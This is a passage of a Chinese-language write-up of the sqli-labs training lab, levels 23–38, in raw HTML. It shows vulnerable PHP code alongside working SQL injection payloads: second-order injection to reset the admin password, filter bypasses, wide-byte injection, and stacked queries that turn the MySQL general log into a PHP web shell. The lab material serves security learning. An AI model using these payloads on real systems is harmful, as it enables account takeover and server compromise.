invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysql_error</span>());</span><br></pre></td></tr></tbody></table></figure>\n\n<p>过滤了注释符，可以使用闭合方式。</p>\n<h4 id=\"3-3-4-Less-24\"><a href=\"#3-3-4-Less-24\" class=\"headerlink\" title=\"3.3.4 Less-24\"></a>3.3.4 Less-24</h4><p><code>login_create.php</code></p>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$username</span>=  <span class=\"title function_ invoke__\">mysql_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'username'</span>]) ;</span><br><span class=\"line\"><span class=\"variable\">$pass</span>= <span class=\"title function_ invoke__\">mysql_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'password'</span>]);</span><br><span class=\"line\"><span class=\"variable\">$re_pass</span>= <span class=\"title function_ invoke__\">mysql_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'re_password'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">\"select count(*) from users where username='<span class=\"subst\">$username</span>'\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$pass</span>==<span class=\"variable\">$re_pass</span>)</span><br><span class=\"line\">  <span class=\"variable\">$sql</span> = <span class=\"string\">\"insert into users ( username, password) values(\\\"<span class=\"subst\">$username</span>\\\", \\\"<span class=\"subst\">$pass</span>\\\")\"</span>;</span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>login.php</code></p>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$username</span> = <span class=\"title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">\"login_user\"</span>]);</span><br><span class=\"line\"><span class=\"variable\">$password</span> = <span class=\"title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">\"login_password\"</span>]);</span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">\"SELECT * FROM users WHERE username='<span class=\"subst\">$username</span>' and password='<span class=\"subst\">$password</span>'\"</span>;</span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>pass_change.php</code></p>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$username</span>= <span class=\"variable\">$_SESSION</span>[<span class=\"string\">\"username\"</span>];</span><br><span class=\"line\"><span class=\"variable\">$curr_pass</span>= <span class=\"title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'current_password'</span>]);</span><br><span class=\"line\"><span class=\"variable\">$pass</span>= <span class=\"title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'password'</span>]);</span><br><span class=\"line\"><span class=\"variable\">$re_pass</span>= <span class=\"title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">'re_password'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$pass</span>==<span class=\"variable\">$re_pass</span>)</span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">\"UPDATE users SET PASSWORD='<span class=\"subst\">$pass</span>' where username='<span class=\"subst\">$username</span>' and password='<span class=\"subst\">$curr_pass</span>' \"</span>;</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这里大部分都被转义了，唯一可利用的地方在最后的<code>update</code>语句中的<code>username</code>，这里需要利用二次注入，即将构造的sql语句插入数据库中，在其被调用时触发。</p>\n<p>比如数据库有<code>username</code>值为<code>admin'#</code>，被拼接进<code>update</code>语句就会变成：</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">UPDATE</span> users <span class=\"keyword\">SET</span> PASSWORD<span class=\"operator\">=</span><span class=\"string\">'$pass'</span> <span class=\"keyword\">where</span> username<span class=\"operator\">=</span><span class=\"string\">'admin'</span>#<span class=\"string\">' and password='</span>$curr_pass<span class=\"string\">'</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>那么就直接修改了<code>admin</code>用户的密码。</p>\n<p>先注册一个名为<code>admin'#</code>的用户</p>\n<img src=\"/posts/31899/image-20250310232549937.png\" class=\"\" title=\"image-20250310232549937\">\n\n<p>然后登录后修改密码</p>\n<img src=\"/posts/31899/image-20250310232652649.png\" class=\"\" title=\"image-20250310232652649\">\n\n<p>查看数据库发现<code>admin</code>用户密码被成功修改了</p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; <span class=\"keyword\">select</span> * from security.users;</span><br><span class=\"line\">+----+----------+------------+</span><br><span class=\"line\">| <span class=\"built_in\">id</span> | username | password   |</span><br><span class=\"line\">+----+----------+------------+</span><br><span class=\"line\">|  1 | Dumb     | Dumb       |</span><br><span class=\"line\">|  2 | Angelina | I-kill-you |</span><br><span class=\"line\">|  3 | Dummy    | p@ssword   |</span><br><span class=\"line\">|  4 | secure   | crappy     |</span><br><span class=\"line\">|  5 | stupid   | stupidity  |</span><br><span class=\"line\">|  6 | superman | genious    |</span><br><span class=\"line\">|  7 | batman   | mob!le     |</span><br><span class=\"line\">|  8 | admin    | 1234       |</span><br><span class=\"line\">|  9 | admin1   | admin1     |</span><br><span class=\"line\">| 10 | admin2   | admin2     |</span><br><span class=\"line\">| 11 | admin3   | admin3     |</span><br><span class=\"line\">| 12 | dhakkan  | dumbo      |</span><br><span class=\"line\">| 14 | admin4   | admin4     |</span><br><span class=\"line\">| 15 | admin<span class=\"string\">'#  | 123        |</span></span><br><span class=\"line\"><span class=\"string\">+----+----------+------------+</span></span><br></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"3-3-5-Less-25\"><a href=\"#3-3-5-Less-25\" class=\"headerlink\" title=\"3.3.5 Less-25\"></a>3.3.5 Less-25</h4><p>接下来很多是绕过过滤的，所以只考虑绕过过滤的部分。</p>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM users WHERE id='<span class=\"subst\">$id</span>' LIMIT 0,1\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/or/i'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);    </span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/AND/i'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);</span><br></pre></td></tr></tbody></table></figure>\n\n<p>双写绕过<code>oorr</code>，符号替换<code>or</code>换成<code>||</code>。</p>\n<h4 id=\"3-3-6-Less-25a\"><a href=\"#3-3-6-Less-25a\" class=\"headerlink\" title=\"3.3.6 Less-25a\"></a>3.3.6 Less-25a</h4><p>无区别。</p>\n<h4 id=\"3-3-7-Less-26\"><a href=\"#3-3-7-Less-26\" class=\"headerlink\" title=\"3.3.7 Less-26\"></a>3.3.7 Less-26</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/or/i'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);           </span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/and/i'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);     </span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/[\\/\\*]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);     </span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/[--]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);    </span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/[#]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);       </span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/[\\s]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);     </span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/[\\/\\\\\\\\]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);    </span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>or</code>和<code>and</code>使用双写或者<code>||``&amp;&amp;</code>替换。</p>\n<p>过滤注释使用闭合绕过。</p>\n<p>空格字符绕过</p>\n<p><code>%a0</code>：空格</p>\n<p><code>%09</code>：TAB键（水平）</p>\n<p><code>%0a</code>：新建一行</p>\n<p><code>%0c</code>：新的一页</p>\n<p><code>%0d</code>：return功能</p>\n<p><code>%0b</code>：TAB键（垂直）</p>\n<p><code>%00</code>：空字符</p>\n<h4 id=\"3-3-8-Less-26a\"><a href=\"#3-3-8-Less-26a\" class=\"headerlink\" title=\"3.3.8 Less-26a\"></a>3.3.8 Less-26a</h4><p>无区别。</p>\n<h4 id=\"3-3-9-Less-27\"><a href=\"#3-3-9-Less-27\" class=\"headerlink\" title=\"3.3.9 Less-27\"></a>3.3.9 Less-27</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/[\\/\\*]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/[--]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/[#]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/[ +]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/select/m'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/select/s'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/Select/s'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/SELECT/s'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/union/s'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/Union/s'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/UNION/s'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);</span><br></pre></td></tr></tbody></table></figure>\n\n<p><code>select</code>和<code>union</code>使用大小写绕过和嵌套绕过即可。</p>\n<h4 id=\"3-3-10-Less-27a\"><a href=\"#3-3-10-Less-27a\" class=\"headerlink\" title=\"3.3.10 Less-27a\"></a>3.3.10 Less-27a</h4><p>无区别。</p>\n<h4 id=\"3-3-11-Less-28\"><a href=\"#3-3-11-Less-28\" class=\"headerlink\" title=\"3.3.11 Less-28\"></a>3.3.11 Less-28</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/[\\/\\*]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/[--]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/[#]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/[ +]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);.</span><br><span class=\"line\"><span class=\"variable\">$id</span>= <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/union\\s+select/i'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);</span><br></pre></td></tr></tbody></table></figure>\n\n<p>不能大小写绕过，嵌套绕过即可。</p>\n<h4 id=\"3-3-12-Less-28a\"><a href=\"#3-3-12-Less-28a\" class=\"headerlink\" title=\"3.3.12 Less-28a\"></a>3.3.12 Less-28a</h4><p>无区别。</p>\n<h4 id=\"3-3-13-Less-29\"><a href=\"#3-3-13-Less-29\" class=\"headerlink\" title=\"3.3.13 Less-29\"></a>3.3.13 Less-29</h4><p>这里主要难点在<code>login.php</code>而不是<code>index.php</code>中。</p>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//提取id</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">java_implimentation</span>(<span class=\"params\"><span class=\"variable\">$query_string</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\">\t<span class=\"variable\">$q_s</span> = <span class=\"variable\">$query_string</span>;</span><br><span class=\"line\">\t<span class=\"variable\">$qs_array</span>= <span class=\"title function_ invoke__\">explode</span>(<span class=\"string\">\"&amp;\"</span>,<span class=\"variable\">$q_s</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">foreach</span>(<span class=\"variable\">$qs_array</span> <span class=\"keyword\">as</span> <span class=\"variable\">$key</span> =&gt; <span class=\"variable\">$value</span>)</span><br><span class=\"line\">\t{</span><br><span class=\"line\">\t\t<span class=\"variable\">$val</span>=<span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$value</span>,<span class=\"number\">0</span>,<span class=\"number\">2</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(<span class=\"variable\">$val</span>==<span class=\"string\">\"id\"</span>)</span><br><span class=\"line\">\t\t{</span><br><span class=\"line\">\t\t\t<span class=\"variable\">$id_value</span>=<span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$value</span>,<span class=\"number\">3</span>,<span class=\"number\">30</span>); </span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"variable\">$id_value</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t}</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"variable\">$qs</span> = <span class=\"variable\">$_SERVER</span>[<span class=\"string\">'QUERY_STRING'</span>];</span><br><span class=\"line\"><span class=\"variable\">$hint</span>=<span class=\"variable\">$qs</span>;</span><br><span class=\"line\"><span class=\"variable\">$id1</span>=<span class=\"title function_ invoke__\">java_implimentation</span>(<span class=\"variable\">$qs</span>);</span><br><span class=\"line\"><span class=\"variable\">$id</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">'id'</span>];</span><br><span class=\"line\"><span class=\"comment\">//id只能为数字</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">whitelist</span>(<span class=\"variable\">$id1</span>);</span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM users WHERE id='<span class=\"subst\">$id</span>' LIMIT 0,1\"</span>;</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这里可以构造两个<code>id</code>，因为<code>java_implimentation()</code>函数只会拿到第一个<code>id</code>去检测，从而使得后面<code>id</code>绕过检测。</p>\n<p>这里根据语言特性绕过可以看本文前面部分。</p>\n<h4 id=\"3-3-14-Less-30\"><a href=\"#3-3-14-Less-30\" class=\"headerlink\" title=\"3.3.14 Less-30\"></a>3.3.14 Less-30</h4><p>没区别。</p>\n<h4 id=\"3-3-15-Less-31\"><a href=\"#3-3-15-Less-31\" class=\"headerlink\" title=\"3.3.15 Less-31\"></a>3.3.15 Less-31</h4><p>没区别。</p>\n<h4 id=\"3-3-16-Less-32\"><a href=\"#3-3-16-Less-32\" class=\"headerlink\" title=\"3.3.16 Less-32\"></a>3.3.16 Less-32</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check_addslashes</span>(<span class=\"params\"><span class=\"variable\">$string</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>{</span><br><span class=\"line\">    <span class=\"variable\">$string</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/'</span>. <span class=\"title function_ invoke__\">preg_quote</span>(<span class=\"string\">'\\\\'</span>) .<span class=\"string\">'/'</span>, <span class=\"string\">\"\\\\\\\\\\\\\"</span>, <span class=\"variable\">$string</span>);  </span><br><span class=\"line\">    <span class=\"variable\">$string</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/\\'/i'</span>, <span class=\"string\">'\\\\\\''</span>, <span class=\"variable\">$string</span>);</span><br><span class=\"line\">    <span class=\"variable\">$string</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">'/\\\"/'</span>, <span class=\"string\">\"\\\\\\\"\"</span>, <span class=\"variable\">$string</span>);      </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$string</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$id</span>=<span class=\"title function_ invoke__\">check_addslashes</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">'id'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM users WHERE id='<span class=\"subst\">$id</span>' LIMIT 0,1\"</span>;</span><br></pre></td></tr></tbody></table></figure>\n\n<p>宽字节注入，<code>%df%5c</code>被当做一个汉字，使得<code>'</code>逃逸。</p>\n<p>使用<code>\\</code>转义<code>\\</code>，如<code>\\\\'</code>，第二个<code>\\</code>被转义，使<code>'</code>出来。</p>\n<p>将 utf-8 转换为 utf-16 或 utf-32，例如将 <code>'</code> 转为 utf-16 为<code>�</code></p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">echo</span> \\'|iconv -f utf-8 -t utf-16</span><br><span class=\"line\">��<span class=\"string\">'</span></span><br></pre></td></tr></tbody></table></figure>\n\n<blockquote>\n<p>这里我的理解是，�在URL编码后为<code>%EF%BF%BD</code>，MySQL 在使用 GBK 编码的时候，<code>%EF%BF</code>被当做一个汉字，<code>%BD</code>与<code>%5c</code>也就是<code>\\</code>被当做一个汉字，因此单引号逃逸出来。</p>\n</blockquote>\n<p>可以让<code>'</code>逃逸出来</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span>�<span class=\"string\">'or 1%23</span></span><br></pre></td></tr></tbody></table></figure>\n\n<img src=\"/posts/31899/image-20250311002549978.png\" class=\"\" title=\"image-20250311002549978\">\n\n<h4 id=\"3-3-17-Less-33\"><a href=\"#3-3-17-Less-33\" class=\"headerlink\" title=\"3.3.17 Less-33\"></a>3.3.17 Less-33</h4><p>没区别。</p>\n<h4 id=\"3-3-18-Less-34\"><a href=\"#3-3-18-Less-34\" class=\"headerlink\" title=\"3.3.18 Less-34\"></a>3.3.18 Less-34</h4><p>没区别。</p>\n<h4 id=\"3-3-19-Less-35\"><a href=\"#3-3-19-Less-35\" class=\"headerlink\" title=\"3.3.19 Less-35\"></a>3.3.19 Less-35</h4><p>没区别。</p>\n<h4 id=\"3-3-20-Less-36\"><a href=\"#3-3-20-Less-36\" class=\"headerlink\" title=\"3.3.20 Less-36\"></a>3.3.20 Less-36</h4><p>没区别</p>\n<h4 id=\"3-3-21-Less-37\"><a href=\"#3-3-21-Less-37\" class=\"headerlink\" title=\"3.3.21 Less-37\"></a>3.3.21 Less-37</h4><p>没区别。</p>\n<h3 id=\"3-4-Less-38-53\"><a href=\"#3-4-Less-38-53\" class=\"headerlink\" title=\"3.4 Less-38-53\"></a>3.4 Less-38-53</h3><blockquote>\n<p>下面无特殊利用的就当做无区别了。</p>\n</blockquote>\n<h4 id=\"3-4-1-Less-38\"><a href=\"#3-4-1-Less-38\" class=\"headerlink\" title=\"3.4.1 Less-38\"></a>3.4.1 Less-38</h4><figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$id</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">'id'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">\"SELECT * FROM users WHERE id='<span class=\"subst\">$id</span>' LIMIT 0,1\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">mysqli_multi_query</span>(<span class=\"variable\">$con1</span>, <span class=\"variable\">$sql</span>)):</span><br><span class=\"line\">    <span class=\"string\">\"查询结果\"</span></span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">print_r</span>(<span class=\"title function_ invoke__\">mysqli_error</span>(<span class=\"variable\">$con1</span>));</span><br></pre></td></tr></tbody></table></figure>\n\n<p>产生堆叠的原因在于<code>mysqli_multi_query()</code>函数，它会执行一个或用分号隔开的多个SQL语句。</p>\n<p>堆叠注入可以直接写马GetShell。</p>\n<p>这里先查看mysql配置</p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show variables like <span class=\"string\">'general%'</span>;</span><br><span class=\"line\">+------------------+---------------------------------+</span><br><span class=\"line\">| Variable_name    | Value                           |</span><br><span class=\"line\">+------------------+---------------------------------+</span><br><span class=\"line\">| general_log      | OFF                             |</span><br><span class=\"line\">| general_log_file | /var/lib/mysql/e783195a8830.<span class=\"built_in\">log</span> |</span><br><span class=\"line\">+------------------+---------------------------------+</span><br></pre></td></tr></tbody></table></figure>\n\n<p>可以看见默认没有开启，首先手动开启。</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">';set global general_log=\"ON\";set global general_log_file='</span><span class=\"operator\">/</span>var<span class=\"operator\">/</span>www<span class=\"operator\">/</span>html<span class=\"operator\">/</span>Less<span class=\"number\">-38</span><span class=\"operator\">/</span>shell.php<span class=\"string\">'%23</span></span><br></pre></td></tr></tbody></table></figure>\n\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show variables like <span class=\"string\">'general%'</span>;</span><br><span class=\"line\">+------------------+---------------------------------+</span><br><span class=\"line\">| Variable_name    | Value                           |</span><br><span class=\"line\">+------------------+---------------------------------+</span><br><span class=\"line\">| general_log      | ON                              |</span><br><span class=\"line\">| general_log_file | /var/www/html/Less-38/shell.php |</span><br><span class=\"line\">+------------------+---------------------------------+</span><br></pre></td></tr></tbody></table></figure>\n\n<p>然后就可以写入php代码了</p>\n<figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">';select '</span><span class=\"operator\">&lt;</span>?php phpinfo();?<span class=\"operator\">&gt;</span><span class=\"string\">'%23</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>查看文件</p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">cat</span> /var/www/html/Less-38/shell.php</span><br><span class=\"line\">250311 14:32:51    10 Connect   root@localhost on security</span><br><span class=\"line\">                 